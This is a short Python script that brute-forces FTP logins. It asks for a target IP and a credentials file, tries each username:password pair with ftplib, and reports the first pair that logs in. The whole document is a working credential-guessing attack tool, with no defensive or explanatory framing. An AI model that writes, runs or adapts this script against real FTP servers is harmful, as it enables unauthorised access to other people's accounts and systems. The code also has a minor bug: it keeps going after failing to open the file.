#!/usr/bin/python3

import ftplib

def bruteLogin(host,passwdFile):
	try:
		pF = open(passwdFile, 'r')
	except:
		print('[!!]Cannot Open File!')

	for line in pF.readlines():
		#splits the info in the txt file and specifys it wants the first one(left one) ex: pass:123 it will pick 'pass'
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\n')
		print('[+]Trying: ' + userName + '/' + passWord)
		try:
			ftp = ftplib.FTP(host)
			login = ftp.login(userName, passWord)
			print('[+]Login Completed with: ' + userName + '/' + passWord)
			ftp.quit()
			return (userName,passWord)
		except:
			pass

	print('[!!] Username/Password Not Found')



host = input('[*]Enter Target IP Address: ')
passwdFile = input('[*]Enter User/Password File Path: ')
bruteLogin(host,passwdFile)
